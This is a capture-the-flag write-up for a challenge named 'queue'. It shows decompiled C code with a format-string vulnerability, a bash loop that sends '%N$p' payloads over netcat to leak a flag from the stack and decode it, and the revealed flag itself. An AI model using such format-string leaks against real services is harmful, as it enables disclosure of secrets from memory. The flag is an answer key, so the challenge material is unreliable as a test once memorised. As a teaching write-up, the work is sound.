#### Challenge:

I just learned about stacks and queues in DSA! `nc challs.actf.co 31322`

[queue](./queue ":ignore")

---

#### Solution:

- reversing the binary in `ghidra` reveals, that we need to leak the `stack` content via `fprint` as our input is later printed through it:
```c
void main(void)

{
  __gid_t __rgid;
  FILE *__stream;
  long in_FS_OFFSET;
  char input_var [48];
  char flag_var [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Error: missing flag.txt.");
    exit(1);
  }
  fgets(flag_var,0x80,__stream);
  printf("What did you learn in class today? ");
  fgets(input_var,48,stdin);
  printf("Oh nice, ");
  printf(input_var);
  printf("sounds pretty cool!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

```bash
for i in `seq 12 20`; 
    do echo "%${i}\$p" | \
        nc challs.actf.co 31322 | \
        grep 0x | awk '{print substr($10, 3)}' | \
        fold -w2 | \
        tac | \
        tr -d "\n"
done | xxd -r -p
```

---

<details><summary>FLAG:</summary>

```
actf{st4ck_it_queue_it_a619ad974c864b22}
```

</details>
<br/>
